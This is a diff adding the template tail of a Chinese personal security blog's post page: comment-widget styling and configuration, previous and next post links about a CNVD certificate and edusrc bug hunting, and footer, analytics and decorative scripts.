+                    <a href="/posts/19d2a2lc.html" class="b-link-green">反弹Shell大全与原理</a>
+                </p>
+            </div>
+
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+    /* valine 评论框增加背景图片 */
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("http://www.luckyzmj.cn/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments .vwrap {
+        box-sizing: border-box;
+        padding: 0 0 44px;
+        background-color: #F0FFF0;
+    }
+    #vcomments .vwrap .vheader{width: 80%;bottom:0;position: absolute;background: #F0FFF0;}
+
+    #vcomments .vinput{padding:10px 15px; text-align: center;}
+
+    #vcomments .vwrap .vheader .vinput{border-bottom:0px}
+
+    #vcomments .vwrap .vedit .vctrl{margin-top:-44px;right:0;position:absolute;margin-right:-3px;}
+
+    #vcomments  .vwrap .vrow{position:absolute;right:0;bottom:0;width:20%;padding-top:0px;}
+
+    #vcomments  .vrow {font-size: 0;padding: 0px 0;}
+
+    #vcomments  .vicon {margin-right: 15px;}
+
+    #vcomments  .vrow .vcol.vcol-30{display: none}
+
+    #vcomments  .vedit .vctrl span.vpreview-btn{display: none}
+
+    #vcomments  .vrow .vcol.vcol-70{width: 100%;}
+
+    #vcomments  .vsubmit.vbtn{border-radius: 0;padding: 0;color: #fff;line-height: 44px;width:100%;border: none;background:#00ecbc;}
+
+    #vcomments  .vcards .vcard .vh .vhead .vsys{background: #F0FFF0;}
+
+    #vcomments  .vcards .vcard .vh .vmeta .vat{font-size: 12px;display: block;margin-left: 15px;float: right;color: #fff;background-color: #00ecbc;line-height: 20px;padding: 0 6px;border-radius: 3px;}
+
+    @media screen and (max-width: 520px){
+    #vcomments  .vwrap .vheader .vinput{width: 33.33%;padding:10px 5px;}  
+    }
+
+    #vcomments input[type=text],
+
+    #vcomments input[type=email],
+
+    #vcomments input[type=url],
+
+    #vcomments textarea {
+        box-sizing: border-box;
+    }
+    #vcomments .vwrap p {
+        height: 20px;
+        width: 20px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #42b983;
+        font-weight: 500;
+        text-decoration: underline;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    /* 修复评论第一行位置错位 */
+    .v .vlist .vcard {
+    padding-top: 2.5em !important ;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div id="vcomments" class="card-content"></div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+
+<script>
+    new Valine({
+        el: '#vcomments',
+        admin_email: '16463223@qq.com',
+        appId: 'IuxzvCGUqeJglfXYmzhrVMaL-gzGzoHsz',
+        appKey: 'YLAclLTRW7a2vONzRRt3R4g2',
+        path: window.location.pathname,
+        comment_count: true,
+        notify: 'false' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'monsterid',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go',
+
+    });
+    $(document).ready(function(){
+        $("#vcomments").on('click', 'span.vat',function(){
+            $(this).parent('div.vmeta').next("div.vcontent").after($("div.vwrap"));
+            $('textarea#veditor').focus();
+        })
+    })
+</script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+<script type="text/javascript">
+    jinrishici.load(function(result) {
+        var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author
+        document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
+    });
+</script>
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/posts/19d2d8o8.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/01.jpg" class="responsive-img" alt="CNVD证书获得及要求">
+                        
+                        <span class="card-title">CNVD证书获得及要求</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            4月份利用闲时时间对学校资产进行了一波渗透测试，发现蛮多的漏洞，这其中就发现了这次证书的漏洞厂商，前不久证书也下来了，再加上有时间就对这次收获做一次总结。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-05-22
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/cnvd/" class="post-category" target="_blank">
+                                    cnvd
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/" target="_blank">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/证书/" target="_blank">
+                        <span class="chip bg-color">证书</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/19d2a2l4.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/03.jpg" class="responsive-img" alt="edusrc挖掘思路">
+                        
+                        <span class="card-title">edusrc挖掘思路</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            好看的证书哪里要？当然是edusrc，本文分享一下我挖edusrc的思路
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-05-09
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/EDUSRC/" class="post-category" target="_blank">
+                                    EDUSRC
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/" target="_blank">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/漏洞/" target="_blank">
+                        <span class="chip bg-color">漏洞</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('220')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: XingHe<br />'
+            + '作者: XingHe<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.bootcss.com/tocbot/4.8.1/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+        <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+           
+             <br>
+             
+            <span id="sitetime"></span><span class="my-face">ღゝ◡╹)ノ♡</span>
+            <br>
+
+            
+
+            
+                    
+                        <span id="busuanzi_container_site_pv" style='display:none'></span>
+                        总访问量: <span id="busuanzi_value_site_pv" class="white-color"></span>
+                    
+            
+
+            
+                &nbsp; | &nbsp;字数统计:&nbsp;
+                <span class="white-color">25.6k</span> 字
+            
+            
+            <br>
+            Copyright&copy; 2020-2021 XingHe  |&nbsp;   <a href="http://www.beian.miit.gov.cn/">
+           
+             <a href="https://beian.miit.gov.cn"><img src="http://luckyzmj.cn/medias/icp.png" />&nbsp;  桂ICP备2020008771号-2
+
+        </div>
+
+        <div class="col s12 m4 l4 social-link social-statis">
+
+ 
+    <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1545975282@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+    <a href="http://wpa.qq.com/msgrd?v=3&uin=1545975282&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的QQ空间" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+
+        var t1 = Date.UTC(2020, 10, 25, 00, 00, 00); //北京时间2019-8-1 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes *
+            minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours +
+            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒" ;
+    } /*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d764390859434140d3dc3c57d9b23601";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+
+
+
+        <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+        <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+        <script src="https://cdn.bootcss.com/materialize/1.0.0/js/materialize.min.js"></script>
+        <script src="https://cdn.bootcss.com/masonry/4.0.0/masonry.pkgd.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+        <script src="https://cdn.bootcss.com/scrollprogress/3.0.2/scrollProgress.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.11/js/lightgallery-all.min.js"></script>
+        <script src="/js/matery.js"></script>
+
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+        
+            <script src="/libs/others/clicklove.js"></script>
+        
+
+        
+            <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+        
+
+        <script type="text/javascript">
+            var OriginTitile = document.title,
+                st;
+            document.addEventListener("visibilitychange", function () {
+                document.hidden ? (document.title = "ヽ(●-`Д´-)ノ你要玩捉迷藏嘛", clearTimeout(st)) : (document.title =
+                    "ヾ(Ő∀Ő3)ノ好哦！", st = setTimeout(function () {
+                        document.title = OriginTitile
+                    }, 3e3))
+            })
+        </script>
+
+        <!-- 鼠标点击烟花爆炸效果 -->
+        
+
+        <!-- 背景雪花飘落特效 -->
+        
+
+        <!-- 鼠标点击文字特效 -->
+        
+            <script src="/js/wenzi.js" type="text/javascript"></script>
+        
+        
+
+        <!-- 背景雪花飘落特效 -->
+        
+            <script type="text/javascript">
+                var windowWidth = $(window).width();
+                if (windowWidth > 768) {
+                    document.write('<script type="text/javascript" src="/js/xuehuapiaoluo.js"><\/script>');
+                }
+            </script>
+        
+
+        <!-- 在线聊天工具  -->
+        
+
+        <!-- 背景 canvas-nest -->
+        
+
+        <!-- 背景静止彩带  -->
+        
+
+        <!-- 背景动态彩带 -->
+        
+            <script type="text/javascript">
+            var windowWidth = $(window).width();
+            if (windowWidth > 992) {
+                document.write('<script type="text/javascript" src="/libs/background/ribbon-dynamic.js"><\/script>');
+            }
+            </script>
+        
+
+        <!-- 天气接口控件   -->
+        
+            <script type="text/javascript">
+            WIDGET = {FID: 'zLkJSQpqsh'}
+            </script>
+        <!-- <script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"></script> -->
+
+        <script type="text/javascript">
+          var windowWidth = $(window).width();
+          if (windowWidth > 768) {
+              document.write('<script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"><\/script>');
+          }
+        </script>
+        
+        
+          <script>
+            (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/410f202e.js","daovoice")
+  daovoice('init', {
+      app_id: "XXXXX"
+    });
+  daovoice('update');
+  </script>
+        
+
+    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":270,"height":350},"mobile":{"show":false},"react":{"opacity":1}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --><script>!function(e){var c=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){for(var r=0;r<c.length;r++)t=c[r],0<=(n=t.getBoundingClientRect()).bottom&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=c[r];t=o,n=function(){c=c.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}i(),e.addEventListener("scroll",function(){var t,n;t=i,n=e,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)})}(this);</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script></body>
+</html>
